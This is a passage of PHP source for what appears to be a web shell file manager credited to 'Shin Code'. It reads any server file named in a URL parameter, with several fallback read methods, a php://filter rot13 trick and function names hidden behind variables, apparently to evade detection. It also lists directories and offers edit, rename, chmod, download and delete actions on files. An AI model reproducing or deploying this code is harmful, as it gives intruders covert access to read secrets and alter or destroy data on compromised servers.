if (isset($_GET['readfile'])) {
    $fileToRead = $_GET['readfile'];
    if (is_readable($fileToRead)) {
        echo "<h5>Reading File: " . htmlspecialchars(basename($fileToRead), ENT_QUOTES, 'UTF-8') . "</h5>";

        $content = @$file_g_c($fileToRead);
        
        if ($content === false) {
            $fileHandle = @$f_opn($fileToRead, 'r');
            if ($fileHandle) {
                $content = fread($fileHandle, filesize($fileToRead));
                fclose($fileHandle);
            } else {
                $content = false;
            }
        }
        
        if ($content === false) {
            $lines = @file($fileToRead);
            if ($lines !== false) {
                $content = implode("\n", $lines);
            }
        }

        if ($content === false) {
            $fileHandle = @$f_opn($fileToRead, 'r');
            if ($fileHandle) {
                $content = @$stream_g_c($fileHandle);
                fclose($fileHandle);
            }
        }
        
        if ($content === false) {
            $fileHandle = @$f_opn($fileToRead, 'r');
            if ($fileHandle) {
                $content = '';
                while (($line = fgets($fileHandle)) !== false) {
                    $content .= $line;
                }
                fclose($fileHandle);
            }
        }

        if ($content === false) {
            $content = @$file_g_c("php://filter/read=string.rot13/resource=" . $fileToRead);
        }

        if ($content !== false) {
            echo "<pre style='white-space: pre-wrap; background-color: #f2f2f2; font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 500px; width: 100%; max-width: 100%; margin-top: 10px;'>";
            echo htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
            echo "</pre>";
        } else {
            echo "<p style='color: red; font-weight: bold;'>Unable to read file. It may not be readable or it doesn't exist.</p>";
        }
    } else {
        echo "<p style='color: red; font-weight: bold;'>Unable to read file. It may not be readable or it doesn't exist.</p>";
    }
}

function formatFileSize($bytes)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

sort($folders);
sort($files);

foreach ($folders as $folder) {
    $path = $directory . "/" . $folder;
    $color = is_writable($path) ? "green" : "red";
    $permissions = getPermissions($path);
    $size = is_file($path) ? formatFileSize(filesize($path)) : '-';
    echo "
    <tr>
        <td style='font-size: 30px; text-align: center;'><a href='?dir=" . urlencode($path) . "'>📁</a></td>
        <td>" . htmlspecialchars($folder, ENT_QUOTES, 'UTF-8') . "</td>
        <td style='text-align: center;'>$size</td>
        <td style='color: $color; text-align: center;'>$permissions</td>
        <td style='text-align: center;'>
            <form method='get' style='display:inline;'>
                <input type='hidden' name='dir' value='" . htmlspecialchars($directory, ENT_QUOTES, 'UTF-8') . "'>
                <input type='hidden' name='target' value='" . htmlspecialchars($folder, ENT_QUOTES, 'UTF-8') . "'>
                <select name='action'>
                    <option value=''>Select</option>
                    <option value='rename'>Rename</option>
                    <option value='chmod'>Chmod</option>
                    <option value='delete'>Delete</option>
                </select>
                <button type='submit'>go To</button>
            </form>
        </td>
    </tr>";
}

foreach ($files as $file) {
    $path = $directory . "/" . $file;
    $color = is_writable($path) ? "green" : "red";
    $permissions = @getPermissions($path);
    $size = is_file($path) ? formatFileSize(filesize($path)) : '-';

    echo "
    <tr>
        <td style='font-size: 30px; text-align: center;'><a href='?dir=" . urlencode($directory) . "&readfile=" . urlencode($directory . DIRECTORY_SEPARATOR . $file) . " '>📄</a></td>
        <td>" . htmlspecialchars($file, ENT_QUOTES, 'UTF-8') . "</td>
        <td style='text-align: center;'>$size</td>
        <td style='color: $color; text-align: center;'>$permissions</td>
        <td style='text-align: center;'>
            <form method='get' style='display:inline;'>
                <input type='hidden' name='dir' value='" . htmlspecialchars($directory, ENT_QUOTES, 'UTF-8') . "'>
                <input type='hidden' name='target' value='" . htmlspecialchars($file, ENT_QUOTES, 'UTF-8') . "'>
                <select name='action'>
                    <option value=''>Select</option>
                    <option value='edit'>Edit</option>
                    <option value='rename'>Rename</option>
                    <option value='chmod'>Chmod</option>
                    <option value='download'>Download</option>
                    <option value='delete'>Delete</option>
                </select>
                <button type='submit'>go To</button>
            </form>
        </td>
    </tr>";
}

echo "</table>
          <div style='border: 1px solid #ccc; padding: 10px; background-color: #f9f9f9; box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 12px; text-align: center;'>
              &copy; " . date('Y') . " ✓ By <a href='https://www.blog-gan.org/' style='text-decoration: none; color: #007BFF; font-weight: bold;'>Shin Code</a>.
          </div>";?>
